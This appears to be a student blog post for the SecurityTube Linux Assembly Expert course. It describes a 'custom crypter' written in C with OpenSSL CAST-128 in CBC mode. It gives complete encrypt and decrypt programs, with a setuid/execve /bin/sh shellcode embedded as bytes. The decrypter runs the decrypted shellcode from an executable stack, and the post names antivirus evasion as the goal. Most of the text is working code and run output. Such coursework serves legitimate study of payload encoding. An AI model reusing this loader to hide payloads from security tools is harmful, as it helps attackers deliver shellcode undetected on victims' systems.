# Assignment 7 #


## Introduction ##

In this last exercise, it is requested to create a "custom crypter" which is a crypter / decrypter based on a crypting system of our choice.  Language is of one’s choosing and in this case it will be C language because it comprises many libraries well documented.

A crypter is a system allowing to crypt / decrypt a payload using a symmetric crypting algorithm such as AES, DES, or asymmetric such as RSA.
The idea is, as encoder, to propose an antivirus escape system.

## Crypter ##

As this is not my favorite field, I investigated some symmetric cryptings as AES, and I have found out many variations such as magenta, serpent or CAST.

So I started from the crypting algorithm CAST-128 and I based my study on the following documentation https://fr.wikipedia.org/wiki/CAST-128.

CAST-128 is a crypting algorithm by block. It appears in some versions of PGP and GPG. It was conceived in 1996 by Carlisle, Adams, Stafford and Tavares and “CAST” comes from the first letters of the 4 creators names. It is based on a Feistel network of 12 or 16 rounds with a block of 64 bits.

The diagram below illustrates three rounds considering the possible operators (addition, xor et soustraction).

<a href="../assets/images/CAST-128-large.png"><img src = "../assets/images/CAST-128-large.png" height="800px"></a>

Source "www.wikipedia.org"

CAST is available with OpenSSL. At first step it is necessary to install the libraries in order to be able to work with OpenSSL. 

`sudo apt-get install libssl-dev`

The compilation will be done with:

`gcc -fno-stack-protector -z execstack decrypt.c -o decrypt -lssl -lcrypto`

The file cast.h informs us on theprototypes of the functions :

Here is what we are going to use, cast_cbc_encrypt allows us to crypt and decrypt (based on the value of enc). I preferred cbc as it comprises one IV which improves the security of the crypting.

```c

# define CAST_BLOCK      8
# define CAST_KEY_LENGTH 16

void CAST_set_key(CAST_KEY *key, int len, const unsigned char *data);
void CAST_cbc_encrypt(const unsigned char *in, unsigned char *out,
                      long length, const CAST_KEY *ks, unsigned char *iv,
                      int enc);

```

## Chiffrement ##

The crypting is based on a key and on a IV. The 16 bytes key has to be keyed at the time of the creation of the crypting.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/cast.h>

void affichageVar(unsigned char* tab, int length, char *name);
void affichage(unsigned char* tab, int length, char* name);

int main(int argc, char *argv[])
{
    CAST_KEY key;

	if (argc < 2)
        {
		printf ("usage ./encrypt [key]\n");
		exit(1);
	}

    // We define here the key
    unsigned char key_data[CAST_KEY_LENGTH];
    
	if (strlen(argv[1]) != 16)
	{
		printf("Taille de le clé incorrecte");
		exit(1);
	}
    
	strcpy(key_data, argv[1]);	

    // We define the Interupt Vector
    // All const are defined in cast.h
    unsigned char iv[CAST_BLOCK];
    unsigned char iv_data[CAST_BLOCK] = {
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
    };

    // Our original shellcode from assignment 6, exec /bin/sh
    unsigned char data[] = \
	"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

    // Round up the length to a multiple of 16 */
    int length  = (int)(strlen(data) + (CAST_BLOCK - 1)) & ~(CAST_BLOCK - 1);

    // temp array for the original shellcode
    // All values are set to 0 because length is a multiple of 16
    char*  temp = (char*) calloc(length, sizeof(char)); 
    
    // Dynamic memory to store the  output of OpenSSL's CAST CBC method
    char* crypt = (char*) malloc(sizeof(char) * length); 

	// Copy the IV data to the IV array
    memcpy(iv, iv_data, CAST_BLOCK);

    // Print IV & key 
    affichageVar(key_data, CAST_KEY_LENGTH, "Key");
    affichageVar(iv_data, CAST_BLOCK, "IV");

    // Copy original shellcode to heap to work with
    memcpy(temp, data, strlen(data));

    // Set the key 
    CAST_set_key(&key, CAST_KEY_LENGTH * 8, key_data);

    // encryption, store the encoded shellcode into crypt
    CAST_cbc_encrypt(temp, crypt, length, &key, iv, CAST_ENCRYPT);

    affichage(crypt, length, "crypted");    

    free(crypt);

    return 0;
}

void affichageVar(unsigned char* tab, int length, char* name)
{
	int i;
	printf("\n[+] %s: ", name);
	for (i = 0; i < length; i++)
        	printf("\\x%02x", *(tab+i));
	
}

void affichage(unsigned char* tab, int length, char* name)
{
        int i;
        printf("\n[+] %s Shellcode: ",name);
        for (i = 0; i < length; i++)
                printf("\\x%02x", *(tab+i));

	printf("\n");
}
```

Once this is done, we get the crypted shellcode. We paste it in the decrypt.c file in order to proceed to the crypting then run the shellcode.  

## Decrypting ##

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/cast.h>

void affichageVar(unsigned char* tab, int length, char *name);
void affichage(unsigned char* tab, int length, char* name);
void exec(unsigned char* shellcode);

int main(int argc, char *argv[])
{
    CAST_KEY key;

    if (argc < 2)
    {
        printf ("usage ./decrypt [key]\n");
        exit(1);
    }

    // We define here the key
    unsigned char key_data[CAST_KEY_LENGTH]; 

    if (strlen(argv[1]) != 16)
    {
        printf("Taille de le clé incorrecte");
        exit(1);
    }
    strcpy(key_data, argv[1]);


    // We define the Interupt Vector
    unsigned char iv[CAST_BLOCK];
    unsigned char iv_data[CAST_BLOCK] = {
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
    };

    
    unsigned char shellcode[] = \		"\x93\x13\xe1\xb2\x5e\x68\xd6\xfa\x71\x8a\x2b\x40\x92\x68\x0b\xf1\x3f\xc7\xba\x74\x4e\xfc\x1f\xcb\xbf\x05\xd8\x92\x3e\x78\x49\x34\x89\x0b\x96\x6f\x19\x48\x4a\xda";

	// Round up the length to a multiple of 16 */
    int length  = (int)(strlen(shellcode) + (CAST_BLOCK - 1)) & ~(CAST_BLOCK - 1);

    // temp array for the original shellcode
    // All values are set to 0 because length is a multiple of 16
    char* origin  = (char*) malloc(sizeof(char) * length); 

    // Copy the IV data to the IV array 
    memcpy(iv, iv_data, CAST_BLOCK);
    affichageVar(key_data, CAST_KEY_LENGTH, "Key");
    affichageVar(iv_data, CAST_BLOCK, "IV");

    // Set the key
    CAST_set_key(&key, CAST_KEY_LENGTH * 8, key_data);
    
    // decrypt, store the decrypted shellcode into origin
    CAST_cbc_encrypt(shellcode, origin, length, &key, iv, CAST_DECRYPT);

    affichage(origin, length, "decrypted");
    printf("\n[+] Shellcode executing ...");
	
    // Execute the decrypted shellcode
    exec(origin);

    return 0;
}

void affichageVar(unsigned char* tab, int length, char* name)
{
	int i;
	printf("\n[+] %s: ", name);
	for (i = 0; i < length; i++)
        	printf("\\x%02x", *(tab+i));
	
}

void affichage(unsigned char* tab, int length, char* name)
{
        int i;
        printf("\n[+] %s Shellcode: ",name);
        for (i = 0; i < length; i++)
                printf("\\x%02x", *(tab+i));

}

void exec(unsigned char* shellcode)
{
	printf("\n[+] Shellcode executing ...");
	  int (*ret)() = (int(*)())shellcode;
	  ret();

}
```



## Result ##

```c

./encrypt aaaazzzzeeeerrrr

[+] Key: \x61\x61\x61\x61\x7a\x7a\x7a\x7a\x65\x65\x65\x65\x72\x72\x72\x72
[+] IV: \xde\xad\xbe\xef\xde\xad\xbe\xef
[+] crypted Shellcode:
\x93\x13\xe1\xb2\x5e\x68\xd6\xfa\x71\x8a\x2b\x40\x92\x68\x0b\xf1\x3f\xc7\xba\x74\x4e\xfc\x1f\xcb\xbf\x05\xd8\x92\x3e\x78\x49\x34
+\x89\x0b\x96\x6f\x19\x48\x4a\xda

// we paste the crypted shellcode into decrypt.c
xophidia@xophidia-VirtualBox:~/Téléchargements$ vim decrypt.c
// then we compile
xophidia@xophidia-VirtualBox:~/Téléchargements$ gcc -fno-stack-protector -z execstack decrypt.c -o decrypt -lssl -lcrypto
// and execute

./decrypt aaaazzzzeeeerrrr

[+] Key: \x61\x61\x61\x61\x7a\x7a\x7a\x7a\x65\x65\x65\x65\x72\x72\x72\x72
[+] IV: \xde\xad\xbe\xef\xde\xad\xbe\xef
[+] decrypted Shellcode:
\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00\x00\x00\x00
[+] Shellcode executing ...
$

```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-3763